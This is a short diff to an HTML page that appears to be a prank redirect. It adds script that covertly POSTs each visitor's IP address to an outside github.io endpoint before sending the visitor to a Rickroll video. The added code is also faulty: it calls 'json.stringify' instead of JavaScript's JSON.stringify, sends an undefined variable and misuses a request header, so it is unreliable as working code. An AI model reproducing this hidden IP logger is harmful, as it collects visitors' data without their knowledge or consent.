@@ -4,7 +4,13 @@
 		<script>
             function getIP(json) 
             {
-                send(json.ip);
+                let xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://cookiedoesstuff.github.io/cat/ip-recieve/", true);
+                xhr.setRequestHeader('ip', 'application/json');
+                xhr.send(json.stringify(
+                {
+                    value: value
+                }));
             }
             window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
         </script>
